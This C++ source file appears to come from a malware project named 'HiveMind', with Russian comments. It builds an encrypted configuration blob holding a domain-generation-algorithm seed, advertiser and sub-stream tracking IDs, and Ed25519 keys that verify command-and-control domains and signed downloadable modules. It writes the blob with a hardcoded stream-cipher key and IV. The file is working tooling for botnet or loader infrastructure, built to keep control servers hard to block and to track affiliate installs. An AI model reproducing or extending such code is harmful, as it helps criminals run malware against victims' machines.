#include <Windows.h>
#include <stdio.h>

extern "C"
{
#include "crypto\ecrypt-sync.h"
}

#define sign_ed25519_PUBLICKEYBYTES 32U

#define CONFIG_KEY "82709784547583932748352793275748"
#define CONFIG_IV "09843197"

/* G:\Work\APRCS\Ed25519_keygen\Release\pubkey.bin (7/9/2020 4:33:08 PM)
StartOffset(h): 00000000, EndOffset(h): 0000001F, Length(h): 00000020 */

/* C:\Work\APRCS\Ed25519_keygen\Release\pubkey.bin (14.12.2021 11:46:52)
StartOffset(h): 00000000, EndOffset(h): 0000001F, Length(h): 00000020 */

unsigned char ed25519_pubkey[32] = {
	0x66, 0xE3, 0x4B, 0x34, 0xF6, 0x3B, 0xE6, 0x58, 0x8A, 0xEC, 0x22, 0x00,
	0x59, 0x4E, 0x41, 0xB6, 0x94, 0x1F, 0xF4, 0xA4, 0xFA, 0x82, 0xD8, 0xCD,
	0x57, 0x22, 0x3F, 0x6F, 0x62, 0xAC, 0x8B, 0x11
};


/* G:\Work\APRCS\Ed25519_keygen\Release\pubkey.bin (3/6/2021 6:54:36 AM)
StartOffset(h): 00000000, EndOffset(h): 0000001F, Length(h): 00000020 */

unsigned char ed25519_module_pubkey[32] = {
	0x2E, 0x64, 0x03, 0x4D, 0xD3, 0x56, 0x78, 0xEC, 0x7B, 0x58, 0xB8, 0xAC,
	0x04, 0xC4, 0xE8, 0x29, 0x44, 0x14, 0x6D, 0x3F, 0xF9, 0xE0, 0x77, 0x53,
	0x61, 0x0A, 0x4B, 0x34, 0x51, 0xA3, 0x01, 0x4A
};


#pragma pack(1)
struct HiveMindConfig
{
	DWORD dwDGASeed;
	DWORD dwAdvertID;
	DWORD dwSubID;
	// публичный ключ сервера для проверки в handshake-верификации дга домена
	unsigned char ed25519_server_publickey[sign_ed25519_PUBLICKEYBYTES];
	// публичный ключ модулей для проверки валидности модуля при загрузке
	unsigned char ed25519_module_publickey[sign_ed25519_PUBLICKEYBYTES];
};
#pragma pack()

int main()
{
	printf("Creating config...");

	HiveMindConfig cfg;
	RtlSecureZeroMemory(&cfg, sizeof(cfg));
	
	// seed для дга генератора
	cfg.dwDGASeed = 38291992;

	// айди адверта и потока
	cfg.dwAdvertID = 1;
	cfg.dwSubID = 2;

	// публичный ключ
	//RtlSecureZeroMemory(cfg.ed25519_server_publickey, sizeof(cfg.ed25519_server_publickey));
	RtlCopyMemory(cfg.ed25519_server_publickey, ed25519_pubkey, sizeof(ed25519_pubkey));
	RtlCopyMemory(cfg.ed25519_module_publickey, ed25519_module_pubkey, sizeof(ed25519_module_pubkey));

	ECRYPT_ctx ctx;
	ECRYPT_init();
	ECRYPT_keysetup(&ctx, (const u8*)CONFIG_KEY, ECRYPT_MAXKEYSIZE, ECRYPT_MAXIVSIZE);
	ECRYPT_ivsetup(&ctx, (const u8*)CONFIG_IV);

	unsigned char *encrypted_config = new BYTE[sizeof(cfg) + 1];
	if (encrypted_config)
	{
		ECRYPT_encrypt_bytes(&ctx, (const u8*)&cfg, encrypted_config, sizeof(cfg));
		
		HANDLE hFileOutput = CreateFileW(L"config.bin", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
		if (hFileOutput != INVALID_HANDLE_VALUE)
		{
			DWORD dwWritten = 0;
			if (WriteFile(hFileOutput, encrypted_config, sizeof(cfg), &dwWritten, NULL))
				printf("Written %d bytes to config.bin\n", dwWritten);
			CloseHandle(hFileOutput);
		}

		delete[]encrypted_config;
	}

	return 0;
}